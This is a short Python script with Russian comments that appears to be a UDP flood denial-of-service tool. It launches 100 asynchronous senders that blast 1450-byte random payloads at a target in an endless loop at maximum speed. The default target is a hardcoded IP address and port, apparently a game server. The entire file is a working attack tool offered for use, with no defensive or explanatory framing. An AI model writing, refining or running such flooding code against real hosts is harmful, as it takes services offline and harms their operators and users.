import asyncio
import sys
import os

# Настройки
PAYLOAD_SIZE = 1450
THREADS_COUNT = 100 # В асинхронности больше не значит лучше

async def udp_sender(ip, port, payload):
    # Создаем транспорт один раз, чтобы не тратить ресурсы
    loop = asyncio.get_running_loop()
    transport, protocol = await loop.create_datagram_endpoint(
        lambda: asyncio.DatagramProtocol(),
        remote_addr=(ip, port)
    )
    
    try:
        while True:
            transport.sendto(payload)
            # Минимальная пауза для переключения контекста (0 = макс скорость)
            await asyncio.sleep(0) 
    except Exception as e:
        print(f"Error: {e}")
    finally:
        transport.close()

async def main():
    if len(sys.argv) < 3:
        target_ip = "77.110.105.224"
        target_port = 8303
    else:
        target_ip = sys.argv[1]
        target_port = int(sys.argv[2])

    print(f"--- ASYNC NODE STARTED ---")
    print(f"Targeting: {target_ip}:{target_port}")

    payload = os.urandom(PAYLOAD_SIZE)
    
    # Запускаем группу корутин
    tasks = [udp_sender(target_ip, target_port, payload) for _ in range(THREADS_COUNT)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nStopped by user.")
